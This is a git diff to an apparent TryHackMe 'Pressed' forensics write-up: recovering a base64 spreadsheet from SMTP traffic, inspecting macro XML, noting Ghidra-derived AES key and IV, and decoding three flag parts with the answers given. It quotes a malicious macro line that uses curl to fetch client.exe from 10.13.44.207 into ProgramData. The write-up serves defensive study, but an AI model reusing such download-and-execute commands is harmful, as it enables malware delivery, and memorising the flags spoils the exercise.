@@ -97,17 +97,19 @@ Note: If in <code>split-screen view</code>, you see the Dock panel in the middle
 <img width="1736" height="767" alt="image" src="https://github.com/user-attachments/assets/be15e4f5-611d-4913-b53a-80545bc111a3" />
 
 <br>
+<br>
+<p>
+
+- save Base64 encoded data into <code>file.txt</code></p>
 
 <img width="1735" height="764" alt="image" src="https://github.com/user-attachments/assets/fd496ef2-7816-4db5-8afb-55067b4e0569" />
 
 <br>
+<br>
 <p>
 
-- filtered smtp<br>
-- followed TCP stream<br>
-- save Base64 encoded data into file.txt<br>
-- decoded it into sheet.ods<br>
-- unziped sheet.ods</p>
+- base64 decoded <code>file.txt</code> into <code>sheet.ods</code><br>
+- unziped code>sheet.ods</code></p>
 
 ```bash
 :~/Pressed#  cat file.txt | base64 -d > sheet.ods
@@ -147,14 +149,25 @@ Archive:  sheet.ods
 script-lc.xml  Standard
 ```
 
+<h4>script-lc.xml</h4>
+
 ```bash
 :~/Pressed#  cat script-lc.xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
 <library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
  <library:library library:name="Standard" library:link="false"/>
-</library:libraries>root@ip-10-201-26-122:~/Basic# cd Standard
+</library:libraries>
 ```
+
+<h4>evil.xml</h4>
+<p>
+
+- cmd /c curl 10.13.44.207/client.exe -o C:\ProgramData\client.exe
+- echo VEhNe0FfQzJfTUF5Xw==<br>
+- C:\\ProgramData\\client.ex</p>
+
+</p>
 
 ```bash
 :~/Pressed# ls
@@ -174,14 +187,14 @@ evil.xml  script-lb.xml
 End Sub
 ```
 
+<br>
+<p>1.1. What is the first part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
+<code>VEhNe0FfQzJfTUF5Xw==</code></p>
+<br>
+
 ```bash
 :~/Pressed# echo 'VEhNe0FfQzJfTUF5Xw==' | base64 -d
 THM{A_C2_MAy_root@ip-10-201-26-122:~/Basic/Standard# cd ..
-```
-
-```bash
-:~/Configurations2# ls
-accelerator  floater  images  menubar  popupmenu  progressbar  statusbar  toolbar  toolpanel
 ```
 
 <br>
@@ -212,9 +225,9 @@ VWSUATAUAVAW
 VWSUATAUAVAW
 ```
 
-<h2>Ghidra</h2>
+<h4>Ghidra</h4>
 
-<h4>Key UTF-8</h4>
+<h5>Key UTF-8</h5>
 <p>
  
 - A = rhI1YazJLaLVgWv4<br>
@@ -230,7 +243,7 @@ VWSUATAUAVAW
 
 <br>
 <br>
-<h4>IV UTF-8</h4>
+<h5>IV UTF-8</h5>
 <p>
  
 - pEw8P3PU9kCcG4sj</p>
@@ -408,17 +421,15 @@ TT\u06c0"ministrator\Desktop\clients.csvr\ufffdI\ufffd\ufffd\ufffd\ufffd`\ufffd\
 ```
 
 <br>
-<p>1.1. What is the first part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
-<code>VEhNe0FfQzJfTUF5Xw==</code></p>
-<br>
-
-```bash
-:~/Pressed# echo 'VEhNe0FfQzJfTUF5Xw==' | base64 -d
-THM{A_C2_MAy_root@ip-10-201-26-122:~/Basic/Standard# cd ..
-```
-
 <p>1.2. What is the second part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
 <code>RWx1RDNfWTB1X1doM25fWW91Xw==</code></p>
+
+```bash
+:~/Pressed# cat outcome.txt
+...
+;\ufffd\ufffd-NV\ufffd\ufffd\ufffd\\ufffd\ufffdA-\ufffdttratorr RWx1RDNfWTB1X1doM25fWW91Xw== /add /YI\ufffd\ufffd\ufffd\ufffd1tLjYT\ufffdMs9\ufffdleted successfully.
+...
+```
 
 ```bash
 :~/Pressed# echo 'RWx1RDNfWTB1X1doM25fWW91Xw==' | base64 -d
@@ -428,6 +439,13 @@ EluD3_Y0u_Wh3n_You_
 <br>
 <p>1.3. What is the third part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
 <code>QXJlX1ByZSRzM2RfNF9UaW0zfQ==</code></p>
+
+```bash
+:~/Pressed# cat outcome.txt
+...
+21,Morissa,QXJlX1ByZSRzM2RfNF9UaW0zfQ==
+...
+```
 
 ```bash
 :~/Pressed# echo 'QXJlX1ByZSRzM2RfNF9UaW0zfQ==' | base64 -d
